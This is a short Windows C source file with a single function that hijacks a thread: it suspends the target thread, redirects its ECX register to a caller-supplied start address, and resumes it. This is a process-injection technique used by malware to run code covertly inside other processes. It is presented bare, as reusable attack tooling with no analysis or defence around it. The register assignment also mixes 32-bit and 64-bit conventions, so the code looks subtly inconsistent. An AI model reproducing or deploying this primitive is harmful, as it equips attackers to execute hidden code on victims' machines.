#include "executil.h"
#include "windows.h"
#include "stdio.h"

BOOL HijackTargetThread(IN HANDLE hThread, IN PVOID pStartAddress) {

	CONTEXT	ThreadCtx = {};
	ThreadCtx.ContextFlags = CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER;

	if (!hThread || !pStartAddress)
		return FALSE;

	if (SuspendThread(hThread) == ((DWORD)-1)) {
		printf("[!] SuspendThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Ecx = (DWORD64) pStartAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if (ResumeThread(hThread) == ((DWORD)-1)) {
		printf("[!] ResumeThread Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}